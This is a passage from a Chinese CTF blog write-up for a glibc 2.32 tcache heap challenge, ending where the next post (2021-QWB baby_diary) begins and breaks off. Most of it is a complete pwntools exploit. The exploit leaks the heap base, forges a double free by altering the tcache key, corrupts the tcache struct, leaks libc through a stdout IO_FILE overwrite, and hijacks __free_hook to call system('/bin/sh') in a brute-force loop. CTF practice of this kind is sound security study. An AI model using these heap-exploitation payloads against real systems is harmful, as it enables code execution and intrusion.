<p>被#—————————包裹起来的部分，这里只能申请0x48或者0x88大小的，因为tcache结构体被破坏，很多bin的数量变大了，不再是0x0，但是tcache中对应的Bin链表中仍然是0x0，再申请对应大小的就会触发程序异常，其实就是放入tcache空闲bin链表的时候错误：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-09.png" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-31.png" alt="img"></p>
<p>3.然后就是劫持IO泄露地址:</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x18</span>,p64(heap_base+<span class="number">0x330</span>)+<span class="string">&#x27;\xbb&#x27;</span>) <span class="comment">#will be used later</span></span><br><span class="line">new(<span class="number">0x18</span>,p16(<span class="number">0x66c0</span>))</span><br><span class="line">new(<span class="number">0x78</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base+<span class="number">0xa8</span>)+p64(heap_base+<span class="number">0xb0</span>)+p64(heap_base+<span class="number">0xb0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#new(0x78,p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment">#this will be OK</span></span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">&#x27;1.add&#x27;</span>)[-<span class="number">13</span>:-<span class="number">7</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xbb</span> - <span class="number">96</span></span><br><span class="line">test = main_arena&gt;&gt;<span class="number">40</span></span><br><span class="line">log.info(<span class="string">&quot;main_arena:0x%x&quot;</span>%main_arena)</span><br><span class="line">log.info(<span class="string">&quot;test:0x%x&quot;</span>%test)</span><br><span class="line"><span class="keyword">if</span>(test != <span class="number">0x7f</span>):</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">malloc_hook = main_arena-<span class="number">0x10</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, malloc_hook)</span><br><span class="line">libc_base = malloc_hook-obj.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="comment">#stdout_addr = u64(p.recvuntil(&#x27;1.add&#x27;)[-13:-7].ljust(8,b&#x27;\x00&#x27;))-132</span></span><br><span class="line"><span class="comment"># log.info(&quot;stdout_addr:0x%x&quot;%stdout_addr)</span></span><br><span class="line"><span class="comment"># obj = LibcSearcher(&quot;_IO_2_1_stdout_&quot;, stdout_addr)</span></span><br><span class="line"><span class="comment"># libc_base = stdout_addr-obj.dump(&#x27;_IO_2_1_stdout_&#x27;)</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">__free_hook_addr = libc_base + obj.dump(<span class="string">&quot;__free_hook&quot;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line">log.info(<span class="string">&quot;system_addr:0x%x&quot;</span>%system_addr)</span><br><span class="line">log.info(<span class="string">&quot;__free_hook_addr:0x%x&quot;</span>%__free_hook_addr)</span><br></pre></td></tr></table></div></figure>

<p>4.最后就是填充，将unsortedbin申请完之后，将unsortedbin从Tcache的结构体中脱离出来，防止再申请的时候乱套。这里直接从topchunk申请，安全一点。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x18</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x18</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#one_gadget = libc_base + 0xdf54c</span></span><br><span class="line">new(<span class="number">0x88</span>, p64(__free_hook_addr^(heap_base/<span class="number">0x1000</span>)))</span><br><span class="line">new(<span class="number">0x38</span>, p64(system_addr))</span><br><span class="line">new(<span class="number">0x38</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>5.最后贴个爆破的exp，有些借鉴了arttnba3师傅的：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/" >https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;./libc-2.24.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="comment">#32bit:malloc_hook = main_arena-0x18</span></span><br><span class="line"><span class="comment">#32bit:main_arena+56(unsortedbin_addr)</span></span><br><span class="line"><span class="comment">#64bit:main_arena+96(unsortedbin_addr)//88 aslo have</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;)        #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">log.info(&quot;libc_base:0x%x&quot;%libc_base)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(binary)</span></span><br><span class="line">    p = process([<span class="string">&#x27;/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6&quot;</span>&#125;)</span><br><span class="line">    <span class="comment">#p = process([&#x27;./ld-2.32.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;49153&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">command</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak heap_base</span></span><br><span class="line">    new(<span class="number">0x80</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    heap_leak = u64(rc(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak*<span class="number">0x1000</span></span><br><span class="line">    log.info(<span class="string">&quot;heap_base:0x%x&quot;</span>%heap_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#change key to make double free</span></span><br><span class="line">    edit(<span class="string">&#x27;PIG007NBPIG007NB&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#change 0x290(7) to free tcache(0x290) into unsortedbin</span></span><br><span class="line">    edit(p64((heap_leak) ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&#x27;\x00\x00&#x27;</span> *((<span class="number">0x290</span>-<span class="number">0x20</span>)/<span class="number">0x10</span>) + <span class="string">&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    <span class="comment">#--------------------------------------------</span></span><br><span class="line">    new(<span class="number">0x88</span>, (<span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x02\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> * <span class="number">2</span> + <span class="string">&#x27;\x01\x00&#x27;</span>).ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment">#--------------------------------------------</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    new(<span class="number">0x18</span>,p64(heap_base+<span class="number">0x330</span>)+<span class="string">&#x27;\xbb&#x27;</span>) <span class="comment">#will be used later</span></span><br><span class="line">    new(<span class="number">0x18</span>,p16(<span class="number">0x66c0</span>))</span><br><span class="line">    new(<span class="number">0x78</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base+<span class="number">0xa8</span>)+p64(heap_base+<span class="number">0xb0</span>)+p64(heap_base+<span class="number">0xb0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#new(0x78,p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment">#this will be OK</span></span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">&#x27;1.add&#x27;</span>)[-<span class="number">13</span>:-<span class="number">7</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xbb</span> - <span class="number">96</span></span><br><span class="line">    test = main_arena&gt;&gt;<span class="number">40</span></span><br><span class="line">    log.info(<span class="string">&quot;main_arena:0x%x&quot;</span>%main_arena)</span><br><span class="line">    log.info(<span class="string">&quot;test:0x%x&quot;</span>%test)</span><br><span class="line">    <span class="keyword">if</span>(test != <span class="number">0x7f</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    malloc_hook = main_arena-<span class="number">0x10</span></span><br><span class="line">    obj = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, malloc_hook)</span><br><span class="line">    libc_base = malloc_hook-obj.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">    <span class="comment">#stdout_addr = u64(p.recvuntil(&#x27;1.add&#x27;)[-13:-7].ljust(8,b&#x27;\x00&#x27;))-132</span></span><br><span class="line">    <span class="comment"># log.info(&quot;stdout_addr:0x%x&quot;%stdout_addr)</span></span><br><span class="line">    <span class="comment"># obj = LibcSearcher(&quot;_IO_2_1_stdout_&quot;, stdout_addr)</span></span><br><span class="line">    <span class="comment"># libc_base = stdout_addr-obj.dump(&#x27;_IO_2_1_stdout_&#x27;)</span></span><br><span class="line"></span><br><span class="line">    system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">    __free_hook_addr = libc_base + obj.dump(<span class="string">&quot;__free_hook&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line">    log.info(<span class="string">&quot;system_addr:0x%x&quot;</span>%system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;__free_hook_addr:0x%x&quot;</span>%__free_hook_addr)</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x58</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x18</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x18</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#one_gadget = libc_base + 0xdf54c</span></span><br><span class="line">    new(<span class="number">0x88</span>, p64(__free_hook_addr^(heap_base/<span class="number">0x1000</span>)))</span><br><span class="line">    new(<span class="number">0x38</span>, p64(system_addr))</span><br><span class="line">    new(<span class="number">0x38</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    free()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;the no.&#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27; try&#x27;</span>)</span><br><span class="line">        p = process([<span class="string">&#x27;/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6&quot;</span>&#125;)</span><br><span class="line">        <span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;, 26018)#process(&#x27;./ff&#x27;) #</span></span><br><span class="line">        exp()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    	<span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></div></figure>

<p>▲总结一下：</p>
<p>(1)IO_FILE的新知识：</p>
<p>new(0x78,p64(0xfbad1800) + p64(0)*3 + b’\x00’)</p>
<p>(2)2.32Tcache机制：</p>
<p>①放入tcache对应bin链表时会异或heap_base/0x1000，并且fd也会变化。</p>
<p>②bin链表中的count和申请与否的关系：</p>
<p>如果tcache的对应bin的count为0，则不会从该Tcache中申请。</p>
<p>如果大于等于1，那么就需要看tcache结构体上对应bin链表存放的chunk地址是否为一个合法的了，如果不合法则会申请失败，程序退出。(应该都是这样的)</p>
<p>③需要修改Key字段才能double free，即free 的时候会检测 key 字段是否为 tcache，如果相等则检测 free 的指针值是否在对应的tcache的bin上，如果在则视为程序在 double free，进而终止程序。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/2021-QWB/">2021-QWB</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、baby_diary</p>
<p>2.31下的off-by-null，多溢出半个字节，所以总共需要爆破一个字节。这里还需要绕过read的检查，不过我这个布局完之后刚好可以通过，也就没太管了。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span 